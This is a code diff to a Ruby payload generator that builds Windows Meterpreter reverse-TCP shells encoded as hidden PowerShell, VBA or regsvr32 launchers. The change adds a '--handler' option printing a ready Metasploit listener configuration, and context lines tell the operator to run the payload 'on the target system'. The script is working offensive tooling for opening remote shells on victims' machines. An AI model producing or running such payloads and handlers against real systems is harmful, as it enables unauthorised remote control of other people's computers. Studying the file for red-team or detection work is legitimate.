@@ -49,10 +49,11 @@ optparse = OptionParser.new do|opts|
     options[:PAYLOAD] = "windows/x64/meterpreter/reverse_tcp"
     options[:ENCODE] = "cmd"
     options[:ARCH] = "64"
+    options[:HAND] = false
 
     opts.on('-i', '--LHOST VALUE', "Local host IP address") do |i|
         options[:LHOST] = i
-    end
+        end
     
     opts.on('-p', '--LPORT VALUE', "Local host port number") do |p|
                 options[:LPORT] = p
@@ -70,6 +71,11 @@ optparse = OptionParser.new do|opts|
                 options[:ENCODE] = t
         end
     opts.separator ""
+    opts.on('--handler', "Show MSF handler options") do |d|
+                options[:HAND] = true
+        end
+
+    opts.separator ""
 end
 
 if ARGV.empty?
@@ -84,6 +90,7 @@ $lport = options[:LPORT]
 $lpayload = options[:PAYLOAD]
 $lencode = options[:ENCODE]
 $exe_arch = options[:ARCH]
+$hand = options[:HAND]
 
 #string byte to hex
 class String
@@ -218,6 +225,22 @@ def prep_PS_chunk(ps_shellcode)
     return stringCommands + "\n" + varFinal
 end 
 
+def msf_opt()
+
+puts "\n\n########msf handler resource options########
+use exploit/multi/handler
+set PAYLOAD #{$lpayload}
+set LHOST #{$lhost}
+set LPORT #{$lport}
+set ExitOnSession false
+set TimestampOutput true
+set EnableStageEncoding true
+set EnableUnicodeEncoding true
+exploit -j
+#######good#luck#and#hack#the#planet#######"
+
+end
+
 ###########################RAW_ENCODE###########################
 if $lencode == "raw"
 
@@ -228,7 +251,6 @@ if $lencode == "raw"
     revme2 = Base64.decode64(revme)
 
     puts revme2
-
 end
 
 ##########################CMD_ENCODE###########################
@@ -238,7 +260,6 @@ if $lencode == "cmd"
     psopt = gen_PS_prefix(powershell_encoded)
     #puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded
     puts psopt 
-
 end
 
 ########################VBA_ENCODE###############################
@@ -730,3 +751,6 @@ puts "To run, execute the following on the target system:\nregsvr32 /s /n /u /i:
 
 end
 
+if $hand
+    msf_opt()
+end
